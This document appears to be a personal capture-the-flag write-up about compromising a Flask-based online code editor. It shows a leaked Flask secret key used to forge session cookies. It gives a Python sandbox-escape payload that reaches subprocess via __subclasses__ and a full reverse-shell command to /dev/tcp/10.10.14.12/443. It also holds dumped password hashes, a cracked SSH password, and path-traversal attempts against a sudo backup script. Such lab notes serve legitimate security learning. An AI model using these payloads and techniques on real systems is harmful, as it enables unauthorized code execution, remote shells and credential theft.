___

# User 

nmap shows ssh and port 5000 gunicorn django server running with ace rich code editor

```python
modulenames = set(sys.modules) & set(globals())
allmodules = [sys.modules[name] for name in modulenames]
```


# Enumerating imports 
```
[<module 'os' from '/usr/lib/python3.8/os.py'>, <module 'io' from '/usr/lib/python3.8/io.py'>, <module 'hashlib' from '/usr/lib/python3.8/hashlib.py'>, <module 'sys' (built-in)>, <module 'app' from '/home/app-production/app/app.py'>]
```

# This lists all the functions in app import (that is devs custom import he wrote the file probs)

`print(dir(app))`

```
['__annotations__', '__call__', '__class__', '__delattr__', '__dict__', '__dir__', '__doc__', '__eq__', '__format__', '__ge__', '__getattribute__', '__gt__', '__hash__', '__init__', '__init_subclass__', '__le__', '__lt__', '__module__', '__ne__', '__new__', '__reduce__', '__reduce_ex__', '__repr__', '__setattr__', '__sizeof__', '__str__', '__subclasshook__', '__weakref__', '_check_setup_finished', '_find_error_handler', '_get_exc_class_and_code', '_got_first_request', '_method_route', '_static_folder', '_static_url_path', 'aborter', 'aborter_class', 'add_template_filter', 'add_template_global', 'add_template_test', 'add_url_rule', 'after_request', 'after_request_funcs', 'app_context', 'app_ctx_globals_class', 'async_to_sync', 'auto_find_instance_path', 'before_request', 'before_request_funcs', 'blueprints', 'cli', 'config', 'config_class', 'context_processor', 'create_global_jinja_loader', 'create_jinja_environment', 'create_url_adapter', 'debug', 'default_config', 'delete', 'dispatch_request', 'do_teardown_appcontext', 'do_teardown_request', 'endpoint', 'ensure_sync', 'error_handler_spec', 'errorhandler', 'extensions', 'finalize_request', 'full_dispatch_request', 'get', 'get_send_file_max_age', 'handle_exception', 'handle_http_exception', 'handle_url_build_error', 'handle_user_exception', 'has_static_folder', 'import_name', 'inject_url_defaults', 'instance_path', 'iter_blueprints', 'jinja_env', 'jinja_environment', 'jinja_loader', 'jinja_options', 'json', 'json_provider_class', 'log_exception', 'logger', 'make_aborter', 'make_config', 'make_default_options_response', 'make_response', 'make_shell_context', 'name', 'open_instance_resource', 'open_resource', 'patch', 'permanent_session_lifetime', 'post', 'preprocess_request', 'process_response', 'put', 'raise_routing_exception', 'redirect', 'register_blueprint', 'register_error_handler', 'request_class', 'request_context', 'response_class', 'root_path', 'route', 'run', 'secret_key', 'select_jinja_autoescape', 'send_static_file', 'session_interface', 'shell_context_processor', 'shell_context_processors', 'should_ignore_error', 'static_folder', 'static_url_path', 'subdomain_matching', 'teardown_appcontext', 'teardown_appcontext_funcs', 'teardown_request', 'teardown_request_funcs', 'template_context_processors', 'template_filter', 'template_folder', 'template_global', 'template_test', 'test_cli_runner', 'test_cli_runner_class', 'test_client', 'test_client_class', 'test_request_context', 'testing', 'trap_http_exception', 'update_template_context', 'url_build_error_handlers', 'url_default_functions', 'url_defaults', 'url_for', 'url_map', 'url_map_class', 'url_rule_class', 'url_value_preprocessor', 'url_value_preprocessors', 'view_functions', 'wsgi_app']

```


I can see jinja is being used 

I tried -> app.Template() 
got error
'Flask' object has no attribute 'Template'

-> app import is flask
website is using flask which integrates nicely with jinja

https://flask.palletsprojects.com/en/stable/api/

i see some  of those functions in the flask docs

`print(vars(app))`

```

{'import_name': 'app', '_static_folder': 'static', '_static_url_path': None, 'template_folder': 'templates', 'root_path': '/home/app-production/app', 'view_functions': {'static': <function Flask.__init__.<locals>.<lambda> at 0x7f04b894a280>, 'index': <function index at 0x7f04b7a3e8b0>, 'register': <function register at 0x7f04b7a3eb80>, 'login': <function login at 0x7f04b7a3ec10>, 'logout': <function logout at 0x7f04b7a3eca0>, 'run_code': <function run_code at 0x7f04b7a3ee50>, 'load_code': <function load_code at 0x7f04b78b9040>, 'save_code': <function save_code at 0x7f04b78b91f0>, 'codes': <function codes at 0x7f04b78b93a0>, 'about': <function about at 0x7f04b78b9550>}, 'error_handler_spec': defaultdict(<function Scaffold.__init__.<locals>.<lambda> at 0x7f04b8fbc670>, {}), 'before_request_funcs': defaultdict(<class 'list'>, {}), 'after_request_funcs': defaultdict(<class 'list'>, {}), 'teardown_request_funcs': defaultdict(<class 'list'>, {}), 'template_context_processors': defaultdict(<class 'list'>, {None: [<function _default_template_ctx_processor at 0x7f04b8b1eca0>]}), 'url_value_preprocessors': defaultdict(<class 'list'>, {}), 'url_default_functions': defaultdict(<class 'list'>, {}), 'instance_path': '/home/app-production/app/instance', 'config': <Config {'DEBUG': False, 'TESTING': False, 'PROPAGATE_EXCEPTIONS': None, 'SECRET_KEY': '7j4D5htxLHUiffsjLXB1z9GaZ5', 'PERMANENT_SESSION_LIFETIME': datetime.timedelta(days=31), 'USE_X_SENDFILE': False, 'SERVER_NAME': None, 'APPLICATION_ROOT': '/', 'SESSION_COOKIE_NAME': 'session', 'SESSION_COOKIE_DOMAIN': None, 'SESSION_COOKIE_PATH': None, 'SESSION_COOKIE_HTTPONLY': True, 'SESSION_COOKIE_SECURE': False, 'SESSION_COOKIE_SAMESITE': None, 'SESSION_REFRESH_EACH_REQUEST': True, 'MAX_CONTENT_LENGTH': None, 'SEND_FILE_MAX_AGE_DEFAULT': None, 'TRAP_BAD_REQUEST_ERRORS': None, 'TRAP_HTTP_EXCEPTIONS': False, 'EXPLAIN_TEMPLATE_LOADING': False, 'PREFERRED_URL_SCHEME': 'http', 'TEMPLATES_AUTO_RELOAD': None, 'MAX_COOKIE_SIZE': 4093, 'SQLALCHEMY_DATABASE_URI': 'sqlite:///database.db', 'SQLALCHEMY_TRACK_MODIFICATIONS': False, 'SQLALCHEMY_ENGINE_OPTIONS': {}, 'SQLALCHEMY_ECHO': False, 'SQLALCHEMY_BINDS': {}, 'SQLALCHEMY_RECORD_QUERIES': False}>, 'aborter': <werkzeug.exceptions.Aborter object at 0x7f04b9031790>, 'json': <flask.json.provider.DefaultJSONProvider object at 0x7f04b90a12b0>, 'url_build_error_handlers': [], 'teardown_appcontext_funcs': [<bound method SQLAlchemy._teardown_session of <SQLAlchemy sqlite:////home/app-production/app/instance/database.db>>], 'shell_context_processors': [<function add_models_to_shell at 0x7f04b7a63c10>], 'blueprints': {}, 'extensions': {'sqlalchemy': <SQLAlchemy sqlite:////home/app-production/app/instance/database.db>}, 'url_map': Map([<Rule '/static/<filename>' (GET, HEAD, OPTIONS) -> static>, <Rule '/' (GET, HEAD, OPTIONS) -> index>, <Rule '/register' (POST, GET, HEAD, OPTIONS) -> register>, <Rule '/login' (POST, GET, HEAD, OPTIONS) -> login>, <Rule '/logout' (GET, HEAD, OPTIONS) -> logout>, <Rule '/run_code' (POST, OPTIONS) -> run_code>, <Rule '/load_code/<code_id>' (GET, HEAD, OPTIONS) -> load_code>, <Rule '/save_code' (POST, OPTIONS) -> save_code>, <Rule '/codes' (POST, GET, HEAD, OPTIONS) -> codes>, <Rule '/about' (GET, HEAD, OPTIONS) -> about>]), 'subdomain_matching': False, '_got_first_request': True, 'cli': <AppGroup app>, 'name': 'app'}
```


The secret key might b the way to go forge admin session cookie

Need to inspect the cookie I have

Yay!

The same can be done with [Cyber Chef](https://gchq.github.io/CyberChef/):

- Put the cookie in the **Input** field
- Drag **From Base64** and **Zlib Inflate** into the **Recipe**
- Set the Base64 alphabet to **URL safe**
- Bake and poof! You get **Output** like:

Decode flask cookie <- 

```
{"_flashes":[{" t":["message","Registration successful! You can now log in."]},{" t":["message","Login successful!"]}],"user_id":3}

```

```
flask-unsign --sign -c '{"_flashes":[{" t":["message","Registration successful! You can now log in."]},{" t":["message","Login successful]}],"user_id":3}' --secret "7j4D5htxLHUiffsjLXB1z9GaZ5" --legacy 
.eJx1jLEKwzAMRH9F0Ry6dOs3ZMpWKhOMozgC14LIpkPwv9fZunS7u3c8PAmXLXnb2Qgfr16hXIHwzWY-MuFIOHMUK4cvohmshtDZVtMAT60QfIasH0gaQfKN0LXxj2fSKL8C11xfq_GxyNrv94ZfXUkyIw.Z-LfQQ.IOZDW0dlM8xDQSC51wBD6loDBPg

```


Forged a cookie as test 

can access user_id : 1 but nothing interesting

path to app:
/home/app-production/app/instance


# I think this is how i gotta do this but the index is not 253

```
render_template_string("{{''.__class__.__mro__[1].__subclasses__()[253]('id', shell=True, stdout=-1).communicate()[0]}}")
```


# Holly it finally worked -- this worked

```
print(render_template_string("{{''.__class__.__mro__[1].__subclasses__()[317]('id', shell=True, stdout=-1).communicate()[0]}}"))

print(''.__class__.__mro__[1].__subclasses__()[317]('id', shell=True, stdout=-1).communicate()[0])
```


this worked as as well the issue  
wasn't the tempting issue is that if you did the object traversal in python those keywords were not blocked. !!!!!!!!


MRO (Method Resolution Order)


FULL PAYLOAD

```
print(''.__class__.__mro__[1].__subclasses__()[317]('/bin/bash -c "sh -i >& /dev/tcp/10.10.14.12/443 0>&1"', shell=True, stdout=-1).communicate()[0])
```


Downloaded sqlite3 db user table
```
sqlite> select * from user;
1|development|759b74ce43947f5f4c91aeddc3e5bad3
2|martin|3de6f30c4a09c27fc71932bfc68474be

```

development -> development


# This logs in ssh

martin -> nafeelswordsmaster

```
martin@code:~$ sudo   -l
Matching Defaults entries for martin on localhost:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User martin may run the following commands on localhost:
    (ALL : ALL) NOPASSWD: /usr/bin/backy.sh
```

```
martin@code:~/backups$ sudo /usr/bin/backy.sh op.sh  json
Error: /root is not allowed. Only directories under /var/ and /home/ are allowed.
```

can't back up root and its cleaning the ../../../ 
if i backup root i just unzip and get flag

either i find a way to pass in the ../../../../../

or there is something i can back up from the /var directory that has creds or something
logs?


this bypasses regex as regex is just removing ../ -> file is empty tho? why?

/home/....//....//....//....//....//....//....//....//....//....//....//root/

i might not be bypassing the script correcly

its either:
1) read some file in some location with backy
2) get a shell from backy.sh script itself with jq maybe
3) or some file in /var/ thats usefull

Run linpeas <-


This is a process running idk if matter

```
root         909  0.0  0.0   5828  1872 tty1     Ss+  Mar24   0:00 /sbin/agetty -o -p -- u --noclear tty1 linux
```


Searching tmux sessions
```
 https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#open-shell-sessions
tmux 3.0a
BZh91AY&SYY{¸ä^@^@^TP^@À^@^D^@^@^H ^@0Ì^E)¦^Sb'<8b>¹"<9c>(H,½Ür^@
~                                                                             5 tmpfiles.d
/tmp/tmux-1000
    l 48K
~         

-rwsr-sr-x 1 daemon daemon 55K Nov 12  2018 /usr/bin/at  --->  RTru64_UNIX_4.0g(CVE-2002-1614)

```































